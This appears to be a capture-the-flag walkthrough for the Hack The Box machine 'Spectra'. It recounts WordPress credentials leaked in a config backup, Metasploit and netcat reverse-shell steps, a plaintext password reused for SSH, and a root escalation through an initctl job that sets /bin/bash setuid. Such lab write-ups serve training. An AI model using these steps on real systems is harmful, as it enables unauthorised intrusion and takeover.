#ports open

22
80
3306

spectra.htb had a two pages

spectra.htb/main
spectra/testing

exploring spectra.htb/main

Wordpress page,with a post and login tab, trying the basic creds found the username is administrator


Testing the spectra.htb/testing, tried a few directories, found creds in wp-config.php.save by either using curl or by viewing the source code

creds:

name: devtest
password: devteam01

tried loggin in through these creds, not worked,

using

name: administrator
password: devteam01

Was able to successfully login, now we are into the wordpress dashboard, there are 3 ways we could get shell

1.Using msfconsole

msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set lhost yourtun0IP
set lport 4444
set rhosts 10.10.10.229
set username administrator
set password devteam01
set targeturi /main
exploit

2.Exploiting Plugin editor.

Search google for any wordpress rev shell,create a new plugin and activate it, start a netcat listener in your own machine

3.Editing themes

Go to theme option, select a theme and edit it,
Go to the 404.php and edit it to get a shell, start a netcat listener on computer and visit a 404 page to get a shell


Note: If there is an error while trying to upload or edit any file, reset the box..It's very buggy


tried enumerating the box, found that there is a file in /opt folder

autologin.conf.orig, reading it found that there is a password file in /etc/autologin, cat it.

password for katie:
SummerHereWeCome!!

ssh into the box as katie, get the user.txt

run sudo -l , found we could run initctl as root, searched google for initctl and it's function

Go to /etc/init
edit test.conf as

script
chmod +s /bin/bash
end script

start the test script

sudo /sbin/initctl start test

now run

/bin/bash -p

and we get root,
now get the root.txt